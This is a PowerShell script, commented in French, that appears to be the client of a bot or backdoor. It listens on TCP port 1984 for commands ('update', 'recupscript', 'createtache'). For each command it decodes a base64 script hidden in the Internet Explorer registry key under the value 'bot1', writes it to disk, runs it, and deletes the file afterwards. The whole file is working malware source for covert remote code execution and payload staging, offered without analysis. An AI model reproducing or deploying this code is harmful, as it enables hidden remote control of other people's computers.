import-module "C:\lib\script1.ps1" -force

function global:FRX_Socket-MessageAction{
    param($message)
    $stop = $false
    switch ($message) {
        {$_ -match "update"}{
            write-host "update en cours" -ForegroundColor green
            $message = $option
            $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
            $Decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($convert64)) | Out-File C:\update.ps1 
            start powershell.exe ./update.ps1 
            Start-Sleep -s 15
            rm c:\update.ps1  # envoyer en paramètre la fonction.

            }
        {$_ -match "recupscript"       }{
            write-host "récupération du script en cours" -ForegroundColor green
            $message = $option
            $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
            $Decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($convert64)) | Out-File c:\recup.ps1
            start powershell.exe ./recup.ps1
            Start-Sleep -s 15
            rm C:\recup.ps1  # envoyer en paramètre la fonction.        
            
            
            }
        {$_ -match "createtache"       }{
            write-host "création de la tâche en cours" -ForegroundColor green
            $message = $option
            $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
            $Decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($convert64)) | Out-File c:\tache.ps1
            start powershell.exe ./tache.ps1 $option
            Start-Sleep -s 60
            rm c:\tache.ps1 # envoyer en paramètre la fonction.
            
            }
        Default {write-host $message}
    }

    return $stop
}

#netstat -ano | find "1984"
$socket   = FRX_Socket-Listen-Connect -port 1984
do{
   $message  = FRX_Socket-Listen-Read -socket $socket -buffersize 512
   $stop = FRX_Socket-MessageAction -message $message
}until($stop)

$closeACK = FRX_Socket-Listen-Close -socket $socket
